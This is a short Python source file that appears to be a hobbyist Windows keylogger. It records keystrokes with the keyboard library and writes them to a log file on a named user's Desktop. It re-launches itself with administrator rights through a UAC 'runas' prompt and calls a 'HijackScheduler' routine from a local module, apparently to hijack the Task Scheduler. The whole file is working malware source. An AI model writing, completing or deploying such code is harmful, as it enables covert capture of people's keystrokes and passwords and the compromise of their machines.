from keyboard import record
import ctypes #Funny C in Py
from sys import executable, argv
from os.path import join
from Jacker import HijackScheduler

c = (ctypes.windll.shell32)
#Applications infact do not get left alone by UAC if launched as admin. Screw you dude on stack overflow thread from 7 years ago, its you and not 7 years
def Log():
    output = open(join('C:/Users/lhill23/Desktop', 'log.txt'), 'w')
    r = record(until='|')
    r = str(r)
    r = r.replace("KeyboardEvent(", '')
    r = r.replace(',', '')
    r = r.replace("down)", ',')
    r = r.replace("up)", '\'')
    output.write(r)

if __name__ == "__main__":
    if not c.IsUserAnAdmin():
        c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None) # Creates new program, BUT DOESNT STOP OLD ONE
        quit() # After new elevated script is running, Keep Yourself Safe #03
    HijackScheduler()
    #Log()